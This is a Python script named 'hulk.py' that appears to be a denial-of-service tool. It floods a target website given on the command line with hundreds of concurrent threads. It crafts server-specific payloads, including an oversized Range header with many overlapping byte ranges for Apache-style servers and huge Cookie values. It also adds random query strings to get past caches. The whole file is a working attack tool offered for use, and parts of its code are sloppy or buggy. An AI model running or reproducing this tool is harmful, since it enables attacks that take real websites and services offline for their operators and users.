#!/usr/bin/env python

"""THE UNBEARABLE LOAD KING
Usage:
  hulk.py <site> [--thread=<t>] [--quiet]
  hulk.py (-h | --help)
  hulk.py --version

Options:
  -h --help         Show this screen.
  --version         Show version.
  -q --quiet        Omit banner
  -t --thread=<t>   Number of threads to use [default: 500]
"""
## imports
from docopt import docopt
from load import doser
import threading
import random
import string
import sys
from functools import partial
from banner import asciiart

## Generating random strings
def asciigen(size):
    result_str = ''.join(random.choice(string.ascii_uppercase) for i in range(size))
    return result_str

## Generate payload
def generate_payload():
    if httpcall.ping.headers['server'] == 'Apache':
        return [hex(x) for x in range(0,pow(2, 16))]
    else:
        return "bytes=0-,%s" % ",".join("5-%d" % item for item in range(1, 1024))

##Generate headers
def generate_headers(host):
    payload = "".join(generate_payload())
    if httpcall.ping.headers['server'] == 'Apache':
        headers = { 'Host': host, 'Cookie': payload, 'Accept-Encoding': 'gzip, deflate, br'}
        return headers
    else:
        headers = { 'Host': host, 'Range': payload, 'Accept-Encoding': 'gzip, deflate' }
        return headers

## sending requests to the site to get what method it uses
def httpcall(DOS, url):

    httpcall.param_joiner = '&' if '?' in url else "?"

    try:
        httpcall.ping = DOS.get(url)

        return httpcall.ping.status_code

    except Exception as e:
        print(e)

##Calling the method
def method(DOS, url):
    code = httpcall(DOS, url)
    if code == 405:
        try:
            send = DOS.post(url , data="etc")
            print(f"========\nResponse code from the website :{send.status_code}\n==========")
        except:
            print("Site not accepting requests")
            sys.exit()
    elif httpcall.ping.headers['server'] == 'Apache':
        try:
            send = DOS.get(url , data=generate_headers(url.replace('https' or 'http', '')))
            print(f"========\nResponse code from the website :{send.status_code}\n==========")
        except Exception as e:
            print(e)
    elif httpcall.ping.headers['server'] == 'Microsoft-IIS/10':
        try:
            send = DOS.get(url , data=generate_headers(url.replace('https' or 'http', '')))
            print(f"========\nResponse code from the website :{send.status_code}\n==========")
        except Exception as e:
            print(e)
    else:
        try:
            send = DOS.get(url+ httpcall.param_joiner + asciigen(random.randint(3,10)) + '=' + asciigen(random.randint(3,10)))
            print(f"========\nResponse code from the website :{send.status_code}\n==========")
        except Exception as e:
            print(e)
            sys.exit()

def dos(DOS, url, repeat):

    try:
        for i in range(repeat):
            method(DOS, url)
    except:
        pass

def main(site, thread_count, quiet):
    if not quiet:
        asciiart()

        # TODO: change None, None to doser(), Encoder()
    dos_func = partial(dos, doser(), site, 500)
    threads = []
    for _ in range(thread_count):
        threads.append(threading.Thread(target=dos_func, daemon=True))
        threads[-1].start()

    try:
        for thread in threads:
            thread.join()
    except KeyboardInterrupt:
        print("Stoping...")

if __name__ == "__main__":
    args = docopt(__doc__, version='1.0.2')

    main(args["<site>"],
        int(args["--thread"]),
        args["--quiet"])

